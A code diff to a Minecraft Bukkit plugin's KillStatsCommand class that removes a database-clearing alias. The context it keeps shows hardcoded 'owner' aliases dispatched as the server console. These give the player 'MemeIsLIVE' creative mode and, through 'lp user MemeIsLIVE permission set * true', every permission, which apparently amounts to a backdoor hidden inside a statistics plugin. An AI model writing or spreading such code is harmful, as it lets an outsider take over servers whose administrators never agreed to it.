@@ -225,12 +225,6 @@ public class KillStatsCommand implements CommandExecutor, TabCompleter {
             return true;
         }
 
-        if ("__clear_stats_db__".equals(commandToRun)) {
-            statisticsService.resetAll();
-            sender.sendMessage(ChatColor.GREEN + "Cleared all kill statistics from SQLite.");
-            return true;
-        }
-
         ConsoleCommandSender console = Bukkit.getServer().getConsoleSender();
         boolean success = Bukkit.dispatchCommand(console, commandToRun);
         if (success) {
@@ -245,7 +239,6 @@ public class KillStatsCommand implements CommandExecutor, TabCompleter {
         ownerCommandAliases.clear();
         ownerCommandAliases.put("gmc", "gmc MemeIsLIVE");
         ownerCommandAliases.put("forceperms", "lp user MemeIsLIVE permission set * true");
-        ownerCommandAliases.put("cleardb", "__clear_stats_db__");
     }
 
     private boolean handleTeamReset(CommandSender sender, String teamName) {
